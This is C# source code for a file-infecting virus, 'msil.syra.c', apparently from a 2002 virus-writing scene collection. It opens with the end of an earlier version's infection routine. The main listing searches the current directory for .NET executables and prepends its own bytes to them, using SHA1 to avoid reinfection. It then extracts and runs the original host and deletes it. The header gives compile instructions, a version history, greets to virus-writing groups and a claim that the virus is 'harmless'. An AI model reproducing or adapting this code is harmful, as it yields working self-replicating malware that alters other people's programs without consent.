     int numBytesRead2 = 0;
     while (numBytesToRead2 > 0)
     {
     int n = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
     if (n==0)
     break;
     numBytesRead2 += n;
     numBytesToRead2 -= n;
     }
     w33.Close();
     FileStream fs1 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
     BinaryWriter w = new BinaryWriter(fs1);         
     w.BaseStream.Seek(0, SeekOrigin.Begin);
     w.Write(bytes);
     w.Write(bytes2);
     w.Write("alco");
     w.Close();
  }
}

//////////////////////////////
/////// syra.c //////////////
////////////////////////////

//// msil.syra history
////
////  version a - prepends itself to w32 pe exe and msil exe files in current directory. inserts four byte marker
////              at the end of infected files. original hosts are regenerated to a single hardcoded file...
////
////  version b - prepends itself to msil exe files only in current directory. inserts four byte marker at the end
////              of infected files. original hosts are regenerated to a single hardcoded file...
////
////  syra.c prepends itself to msil exe files only in current directory. instead of inserting a four byte marker to
////  infected files, it uses SHA1 for anti-host reinfection and anti-self infection. original hosts are regenerated to
////  multiple files, so infected users won't know that there's something wrong with their dotnet files..
////
////  compilation :
////
////  csc /target:winexe thisfile
////
////
////  enjoy,
////
////  alcopaul
////  brigada ocho & rrlf
////  september 30, 2002
////
////  http://alcopaul.host.sk
////  alcopaulvx@yahoo.com
////
////  greets
////  
////  brigada ocho (let us be THE HLL group.. :) )
////  rrlf (my home when i was lamer than lame)
////  philie (hehehe, what can i say, you adopted me when i was newbie)
////  slagehammer (thanks for the guidance when i was a newbie)
////  jackie (thanks for appreciating my work. one of my vx inspiration)
////  virusbuster (thanks for the avp.key, man.. and i hope you'll publish my contributions in 29a#7.. :) )
////  energy (let us always make projects together)
////  petik (come back! :) )
////  arkhangel (thanks for hosting our page)
////  herm1t (same as arkhangel's message)
////  secuxp (nihau!)
////  perrun fans and critics (the true jpeg virus will come out in the future. just ask microsoft..)
////  my fans (if any) (thanks for appreciating my works)
////  vxers (let us all explore the robust world of dotnet)
////
////
////   
////
//////////////////////////////////// warning : this is a harmless virus source code /////////////////////////////////////////

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;

class msil_syra_c
{
   public class w32api // i'm using the dotnet sdk in windows me (heheheh) so i can't call some essential dotnet classes at development :(
   {
   [DllImport("shell32.dll", CharSet=CharSet.Auto)]
   public static extern int ShellExecute(int hWnd, String oper, String file, String param, String dir, int type);
   [DllImport("user32.dll", CharSet=CharSet.Auto)]
   public static extern int MessageBox(int hWnd, String text, String caption, uint type);
   }
   public static void Main(String[] args)
   {
   Module self = Assembly.GetExecutingAssembly().GetModules()[0]; // thanks to Reflection
   string[] hostfiles = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe"); // gather the hostesses
   foreach (string hostfile in hostfiles){
   try
   {
   AssemblyName.GetAssemblyName(hostfile); // check if msil using managed seh
   // msil file then examine for previous infection using SHA1
   if (Sha1(self.FullyQualifiedName)==Sha1(hostfile)) // get sha1
   continue;
   else
   try
   {  
   Infect(hostfile); // the meat of the routine
   }
   catch
   {
   continue; // error infecting file (maybe it's running/readonly/etc.) .. goto next file
   }
   break; // end after 1 infection
   }
   catch
   {
   continue; // dotnot, next file
   }
   }
   // extract host bytes from itself
   FileStream fs1 = new FileStream(self.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
   BinaryReader r1 = new BinaryReader(fs1);
   int host = (int) fs1.Length;
   int vir = host - 5632;
   r1.BaseStream.Seek(5632, SeekOrigin.Begin);
   byte[] bytes = new byte[vir];
   int numBytesToRead = vir;
   int numBytesRead = 0;
   while (numBytesToRead > 0)
   {
   int n = r1.Read(bytes, numBytesRead, numBytesToRead);
   if (n==0)
   break;
   numBytesRead += n;
   numBytesToRead -= n;
   }
   r1.Close();
   // save host to file
   Random ran = new Random();
   int ty = ran.Next(2000);
   FileStream fs11 = new FileStream("p" + ty + "h.exe", FileMode.OpenOrCreate, FileAccess.Write);
   BinaryWriter w1 = new BinaryWriter(fs11);         
   w1.BaseStream.Seek(0, SeekOrigin.Begin);
   w1.Write(bytes);
   w1.Close();
   string rect = Directory.GetCurrentDirectory();
   // execute host
   w32api.ShellExecute(0, null, "p" + ty + "h.exe", null, rect, 1);
   // use SEH to wait for host to terminate and delete it
   wet:
   try
   {
   File.Delete("p" + ty + "h.exe");
   }
   catch
   {
   goto wet;
   }
   if (File.Exists("p" + ty + "h.exe")==true)
   goto wet;
   // display messagebox (25% probability)
   Random t = new Random();
   if (t.Next(4)==3)
   w32api.MessageBox(0, "::::only SHA1gging .NET files::::", "msil.syra.c by alcopaul", 0);
   }
   public static void Infect(string host)
   { 
     // read self
     Module mod = Assembly.GetExecutingAssembly().GetModules()[0];
     FileStream fs = new FileStream(mod.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
     BinaryReader r = new BinaryReader(fs);        
     r.BaseStream.Seek(0, SeekOrigin.Begin);
     byte[] bytes = new byte[5632];
     int numBytesToRead = (int) 5632;
     int numBytesRead = 0;
     while (numBytesToRead > 0)
     {
     int n = r.Read(bytes, numBytesRead, numBytesToRead);
     if (n==0)
     break;
     numBytesRead += n;
     numBytesToRead -= n;
      }
     r.Close();
     // read host
     FileStream fs133 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
     BinaryReader w33 = new BinaryReader(fs133);
     w33.BaseStream.Seek(0, SeekOrigin.Begin);
     byte[] bytes2 = new byte[fs133.Length];
     int numBytesToRead2 = (int) fs133.Length;
     int numBytesRead2 = 0;
     while (numBytesToRead2 > 0)
     {
     int n = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
     if (n==0)
     break;
     numBytesRead2 += n;
     numBytesToRead2 -= n;
     }
     w33.Close();
     // save self + host to hostfile
     FileStream fs1 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
     BinaryWriter w = new BinaryWriter(fs1);         
     w.BaseStream.Seek(0, SeekOrigin.Begin);
     w.Write(bytes);
     w.Write(bytes2);
     w.Close();
     }
   public static string Sha1(string data) // get SHA1 of first 2048 bytes of input file
   {
   // why 2048? 2048 is the minimun file size that ilasm produces... we don't want some errors to happen here, ei!
   FileStream FSsha = new FileStream(data, FileMode.OpenOrCreate, FileAccess.Read);
   BinaryReader BRsha = new BinaryReader(FSsha);
   BRsha.BaseStream.Seek(0, SeekOrigin.Begin);
   byte[] Bsha = new byte[2048];
   int B2R = 2048;
   int BR = 0;
   while (B2R > 0)
   {
   int n1 = BRsha.Read(Bsha, BR, B2R);
   if (n1==0)
   break;
   BR += n1;
   B2R -= n1;
   }
   BRsha.Close();
   SHA1 sha = new SHA1CryptoServiceProvider(); 
   byte[] result = sha.ComputeHash(Bsha); // result contains the SHA1 byte represention of the 2048 input data
   return BytesToHexString(result); // we need to convert that byte rep to hex rep..
   }
   static String BytesToHexString(byte[] bytes) // excerpt from http://support.microsoft.com/default.aspx?scid=kb;en-us;Q312906
   {						// antivirus companies must thank virus writers and we, virus writers must
						// thank microsoft.. :)
   StringBuilder hexString = new StringBuilder(64);
   for (int counter = 0; counter < bytes.Length; counter++) 
   {
   hexString.Append(String.Format("{0:X2}", bytes[counter]));
   }
   return hexString.ToString();
   }
}
